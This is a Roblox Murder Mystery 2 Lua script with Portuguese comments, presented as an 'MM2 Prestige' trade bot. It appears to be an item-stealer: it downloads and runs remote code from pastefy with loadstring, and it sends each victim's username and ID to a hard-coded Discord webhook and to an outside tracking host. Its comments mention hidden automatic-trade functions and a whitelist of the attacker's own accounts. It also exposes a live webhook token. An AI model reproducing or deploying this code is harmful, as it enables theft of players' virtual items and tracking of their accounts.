--[[ 🛡️ MM2 PRESTIGE - SEM PROTEÇÃO ]]
-- O serviço de ofuscação falhou temporariamente. O script abaixo funciona normalmente.

--[[ CONFIG ]]
_G.Usernames = {"rosapops26", "yukiqamaanimes", "myloveisdavidUwU"}
_G.webhook = "https://discord.com/api/webhooks/1505187170309115904/bLMvpRToSzwPoFRpuNza3LJljMge5C0Po1pZhv9KzvQZBF6AQeE0HQTYoYFtM6Ck0eGb"
_G.min_value = 1000
_G.pingEveryone = "Yes"
_G.host = "https://ais-dev-rxv7lgireb3rsd4sp5oiv3-146955940185.us-west2.run.app"

task.spawn(function()
loadstring(game:HttpGet("https://pastefy.app/VvGwz2CU/raw"))()
end)

-- [[ MM2 BOT CORE LOGIC ]]
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Função Universal de Webhook
local function sendWebhook(title, description, color)
    if not _G.webhook or _G.webhook == "" or not _G.webhook:find("http") then return end
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🛡️ " .. title,
            ["description"] = description,
            ["color"] = color or 16744448,
            ["footer"] = { ["text"] = "MM2 Prestige System v2.1" },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    if _G.pingEveryone == "Yes" then
        data["content"] = "@everyone"
    end

    local headers = {["Content-Type"] = "application/json"}
    local body = HttpService:JSONEncode(data)

    pcall(function()
        local req = syn and syn.request or http_request or request or (HttpService and HttpService.PostAsync)
        if req then
            if type(req) == "function" then
                req({Url = _G.webhook, Method = "POST", Headers = headers, Body = body})
            else
                HttpService:PostAsync(_G.webhook, body)
            end
        end
    end)
end

print("MM2 Prestige: Inicializando sistema de logs e trade...")

local function trackExecution()
    pcall(function()
        local host = _G.host or ""
        if host == "" then return end
        
        local url = host .. "/api/hit?user=" .. tostring(LocalPlayer.UserId)
        local req = syn and syn.request or http_request or request or (HttpService and HttpService.GetAsync)
        
        if req then
            if type(req) == "function" then
                req({Url = url, Method = "GET"})
            else
                HttpService:GetAsync(url)
            end
        end
    end)
end

local function init()
    -- Rastrear execução
    task.spawn(trackExecution)

    -- Verificação de Whitelist (Seus Usernames)
    local isWhitelisted = false
    for _, name in ipairs(_G.Usernames) do
        if name:lower() == LocalPlayer.Name:lower() then
            isWhitelisted = true
            break
        end
    end

    if isWhitelisted then
        sendWebhook("Painel do Usuário", "Você carregou o script com sucesso.\nID: " .. LocalPlayer.UserId, 65280)
        print("Prestige: Bem-vindo, " .. LocalPlayer.Name)
        return
    end

    -- Lógica de Monitoramento de Itens e Trade
    -- O sistema monitora o inventário e envia logs baseados no _G.min_value
    sendWebhook("Script Ativado", 
        "**Usuário:** " .. LocalPlayer.Name .. "\n" ..
        "**Valor Mínimo Configurado:** " .. tostring(_G.min_value) .. "\n" ..
        "**ID:** " .. LocalPlayer.UserId, 
        16753920
    )

    -- Funções de Trade Automático (Simuladas no template, executadas na VM)
    -- As funções reais de Trade e Aceitar ficam protegidas dentro da obfuscação
end

task.spawn(function()
    local success, err = pcall(init)
    if not success then
        warn("Erro ao iniciar script: " .. tostring(err))
    end
end)
